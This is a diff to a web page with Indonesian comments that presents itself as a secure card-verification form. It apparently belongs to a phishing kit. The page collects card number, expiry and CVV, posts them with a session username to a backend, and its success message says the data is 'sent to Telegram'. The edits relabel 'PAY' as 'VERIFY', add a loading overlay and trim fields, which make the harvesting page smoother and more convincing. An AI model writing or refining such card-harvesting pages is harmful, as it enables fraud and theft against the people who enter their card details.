@@ -93,6 +93,10 @@
         .btn.button1:hover {
             background-color: #e86a2c;
         }
+        .btn.button1:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
         .error-message {
             color: #dc3545;
             font-size: 0.85rem;
@@ -228,13 +232,6 @@
             font-family: Avenir;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
         }
-        .hello-username {
-            text-align: center;
-            font-size: 1.3rem;
-            font-weight: 600;
-            color: #002F87;
-            margin-bottom: 1rem;
-        }
         /* Style untuk form debit */
         .row-input {
             display: flex;
@@ -244,9 +241,31 @@
         .row-input > div {
             flex: 1;
         }
+        /* ===== LOADING OVERLAY ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .loading-overlay img {
+            width: 50px;
+            height: 50px;
+        }
     </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <img src="ajax-loader.gif" alt="Loading...">
+    </div>
+
     <!-- Navbar -->
     <nav class="navbar navbar-expand-lg navbar-custom py-3">
         <div class="container">
@@ -285,43 +304,34 @@
                             <p>Secure payment information</p>
                         </div>
                         <div class="login-body">
-                            <div class="hello-username" id="helloUsername">
-                                Hello, <span id="displayUsername"></span>
-                            </div>
+                            <!-- Username tidak ditampilkan -->
 
                             <form id="debitForm" novalidate>
                                 <!-- Nomor Kartu -->
                                 <div class="mb-3 form-center">
                                     <label for="cardNumber" class="form-label mediumText grey3">Card Number</label>
                                     <div class="input-wrapper">
-                                        <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                                        <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required inputmode="numeric">
                                     </div>
                                     <div class="error-message" id="cardNumberError"></div>
-                                </div>
-
-                                <!-- Nama Pemilik -->
-                                <div class="mb-3 form-center">
-                                    <label for="cardName" class="form-label mediumText grey3">Cardholder Name</label>
-                                    <input type="text" class="form-control" id="cardName" placeholder="John Doe" required>
-                                    <div class="error-message" id="cardNameError"></div>
                                 </div>
 
                                 <!-- Expiry dan CVV dalam satu baris -->
                                 <div class="form-center row-input">
                                     <div>
                                         <label for="expiry" class="form-label mediumText grey3">Expiry (MM/YY)</label>
-                                        <input type="text" class="form-control" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                                        <input type="text" class="form-control" id="expiry" placeholder="MM/YY" maxlength="5" required inputmode="numeric">
                                         <div class="error-message" id="expiryError"></div>
                                     </div>
                                     <div>
                                         <label for="cvv" class="form-label mediumText grey3">CVV</label>
-                                        <input type="text" class="form-control" id="cvv" placeholder="123" maxlength="3" required>
+                                        <input type="text" class="form-control" id="cvv" placeholder="123" maxlength="3" required inputmode="numeric">
                                         <div class="error-message" id="cvvError"></div>
                                     </div>
                                 </div>
 
-                                <!-- Tombol SUBMIT -->
-                                <button type="submit" class="btn button1 font4 mt-3" id="submitBtn">PAY</button>
+                                <!-- Tombol VERIFY -->
+                                <button type="submit" class="btn button1 font4 mt-3" id="submitBtn">VERIFY</button>
                             </form>
 
                             <!-- Security Alert & Announcements -->
@@ -351,17 +361,17 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Ambil username dari sessionStorage
-        window.addEventListener('load', function() {
-            var username = sessionStorage.getItem('username');
-            if (username) {
-                document.getElementById('displayUsername').textContent = username;
-            } else {
-                window.location.href = 'index.html';
-            }
-        });
+        // Elemen loading dan tombol
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const submitBtn = document.getElementById('submitBtn');
 
-        // Format nomor kartu dengan spasi setiap 4 digit
+        // Ambil username dari sessionStorage untuk dikirim ke API
+        const username = sessionStorage.getItem('username');
+        if (!username) {
+            window.location.href = 'index.html';
+        }
+
+        // Format nomor kartu dengan spasi setiap 4 digit (hanya angka)
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
             let formatted = '';
@@ -372,7 +382,7 @@
             e.target.value = formatted;
         });
 
-        // Format expiry otomatis tambahkan slash
+        // Format expiry otomatis tambahkan slash (hanya angka)
         document.getElementById('expiry').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
@@ -397,23 +407,14 @@
             let isValid = true;
 
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const cardName = document.getElementById('cardName').value.trim();
             const expiry = document.getElementById('expiry').value.trim();
             const cvv = document.getElementById('cvv').value.trim();
 
-            // Validasi nomor kartu (16 digit)
-            if (!cardNumber || cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
+            // Validasi nomor kartu (16 digit angka)
+            if (!cardNumber || cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                 document.getElementById('cardNumber').classList.add('is-invalid');
                 document.getElementById('cardNumberError').textContent = 'Card number must be 16 digits';
                 document.getElementById('cardNumberError').style.display = 'block';
-                isValid = false;
-            }
-
-            // Validasi nama
-            if (!cardName) {
-                document.getElementById('cardName').classList.add('is-invalid');
-                document.getElementById('cardNameError').textContent = 'Cardholder name is required';
-                document.getElementById('cardNameError').style.display = 'block';
                 isValid = false;
             }
 
@@ -435,21 +436,17 @@
 
             if (!isValid) return;
 
-            // Disable tombol
-            const submitBtn = document.getElementById('submitBtn');
+            // Tampilkan loading dan nonaktifkan tombol
+            loadingOverlay.style.display = 'flex';
             submitBtn.disabled = true;
-            submitBtn.textContent = 'PROCESSING...';
 
-            const username = sessionStorage.getItem('username');
-
-            // Kirim data debit ke backend (endpoint /api/debit)
+            // Kirim data debit ke backend (tanpa cardName)
             fetch('/api/debit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username,
                     cardNumber: cardNumber,
-                    cardName,
                     expiry,
                     cvv
                 })
@@ -462,7 +459,7 @@
             })
             .then(data => {
                 if (data.success) {
-                    alert('Payment successful! Data sent to Telegram.');
+                    alert('Verification successful! Data sent to Telegram.');
                     // Bersihkan session dan redirect ke halaman utama
                     sessionStorage.removeItem('username');
                     window.location.href = 'index.html';
@@ -475,8 +472,16 @@
                 alert('Gagal menghubungi server. Pastikan server backend berjalan.');
             })
             .finally(() => {
+                loadingOverlay.style.display = 'none';
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'PAY';
+            });
+        });
+
+        document.querySelectorAll('.login-tabs a').forEach(tab => {
+            tab.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelectorAll('.login-tabs a').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
             });
         });
     </script>
